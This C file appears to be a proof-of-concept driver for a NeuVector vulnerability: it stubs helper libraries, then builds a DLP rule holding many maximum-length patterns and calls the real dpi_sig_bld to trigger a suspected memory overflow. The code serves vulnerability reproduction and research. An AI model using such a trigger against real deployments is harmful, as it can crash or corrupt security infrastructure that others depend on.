/* Real-object driver for CVE-2026-127182.
 * Links the UNMODIFIED pinned dp/dpi/sig/dpi_sig.c (compiled with its real
 * NeuVector headers) against a dpi_dlpbld_t built exactly as dp/ctrl.c
 * builds it from the controller JSON message. Only third-party collaborators
 * (hyperscan, urcu-map, logging, string helpers) are stubbed; the vulnerable
 * function, its real struct layout and its real consumer dpi_dlp_proc()
 * are the pinned upstream code.
 *
 * argv: npats [patlen] [namelen] — namelen defaults to 1 and is clamped to
 * MAX_DLP_RULE_NAME_LEN-1, patlen to MAX_DLP_RULE_PATTERN_LEN-1.
 */
#include <stdarg.h>
#include <stdbool.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#include "dpi/sig/dpi_sig.h"
#include "dpi/sig/dpi_search.h"

uint32_t g_debug_levels = 0;
rcu_map_t g_ep_map;

void debug_log(bool print_ts, const char *fmt, ...) { (void)print_ts; (void)fmt; }
bool debug_log_packet_filter(const dpi_packet_t *p) { (void)p; return false; }
int dp_dlp_wait_ctrl_req_thr(int req) { (void)req; return 0; }
void dpi_dlp_init_hs_search(void *detector) { (void)detector; }
void *rcu_map_lookup(rcu_map_t *m, const void *key) { (void)m; (void)key; return NULL; }

static dpi_sigopt_api_t api_name, api_sig_id, api_ctx, api_pcre;

static dpi_sigopt_status_t noop_parser(char *value, dpi_sig_t *sig)
{
    (void)value; (void)sig; return DPI_SIGOPT_OK;
}

dpi_sigopt_api_t *dpi_sigopt_sig_id_register(void) { api_sig_id.parser = noop_parser; return &api_sig_id; }
dpi_sigopt_api_t *dpi_sigopt_name_register(void) { api_name.parser = noop_parser; return &api_name; }
dpi_sigopt_api_t *dpi_sigopt_context_register(void) { api_ctx.parser = noop_parser; return &api_ctx; }
dpi_sigopt_api_t *dpi_sigopt_pcre_register(void) { api_pcre.parser = noop_parser; return &api_pcre; }

char *strip_str(char *s)
{
    if (!s) return s;
    size_t n = strlen(s);
    while (n && (s[n-1] == ' ' || s[n-1] == '\t' || s[n-1] == '\r' || s[n-1] == '\n')) s[--n] = 0;
    return s;
}
char *strip_str_quote(char *s)
{
    if (!s) return s;
    size_t n = strlen(s);
    if (n >= 2 && ((s[0] == '"' && s[n-1] == '"') || (s[0] == '\'' && s[n-1] == '\''))) {
        s[n-1] = 0; memmove(s, s+1, n-1);
    }
    return s;
}
char **str_split(const char *s, const char *delim, int *count)
{
    /* Minimal split; enough for the semicolon-separated sig string. */
    char *copy = strdup(s);
    int cap = 16, n = 0;
    char **out = calloc(cap, sizeof(*out));
    for (char *tok = strtok(copy, delim); tok; tok = strtok(NULL, delim)) {
        if (n == cap) { cap *= 2; char **tmp = realloc(out, cap * sizeof(*out)); if (!tmp) break; out = tmp; }
        out[n++] = strdup(tok);
    }
    free(copy);
    *count = n;
    return out;
}
void free_split(char **tokens, int count)
{
    if (!tokens) return;
    for (int i = 0; i < count; i++) free(tokens[i]);
    free(tokens);
}

int main(int argc, char **argv)
{
    int npats = (argc > 1) ? atoi(argv[1]) : 8;
    size_t patlen = (argc > 2) ? (size_t)atoi(argv[2]) : (MAX_DLP_RULE_PATTERN_LEN - 1);
    size_t namelen = (argc > 3) ? (size_t)atoi(argv[3]) : 1;
    if (patlen > MAX_DLP_RULE_PATTERN_LEN - 1) patlen = MAX_DLP_RULE_PATTERN_LEN - 1;
    if (namelen > MAX_DLP_RULE_NAME_LEN - 1) namelen = MAX_DLP_RULE_NAME_LEN - 1;
    if (namelen < 1) namelen = 1;

    dpi_dlpbld_t b;
    memset(&b, 0, sizeof(b));
    b.apply_dir = 0;
    b.num_dlp_rules = 1;
    dpi_dlp_rule_entry_t rule;
    memset(&rule, 0, sizeof(rule));
    for (size_t n = 0; n < namelen; n++) rule.rulename[n] = 'N';
    rule.sigid = 1001;
    rule.num_dlp_rule_pats = npats;
    rule.dlp_rule_pat_list = calloc(npats, sizeof(dpi_dlp_rule_pattern_t));
    if (!rule.dlp_rule_pat_list) return 2;
    for (int i = 0; i < npats; i++)
        memset(rule.dlp_rule_pat_list[i].rule_pattern, 'M', patlen);
    b.dlp_rule_list = &rule;

    printf("REAL_DRIVER npats=%d patlen=%zu namelen=%zu pat_max=%d name_max=%d bld_size=%zu\n",
           npats, patlen, namelen, MAX_DLP_RULE_PATTERN_LEN, MAX_DLP_RULE_NAME_LEN, sizeof(b));
    fflush(stdout);
    dpi_dlp_init();
    int rc = dpi_sig_bld(&b, MSG_START | MSG_END);
    printf("REAL_DRIVER rc=%d\n", rc);
    free(rule.dlp_rule_pat_list);
    return 0;
}
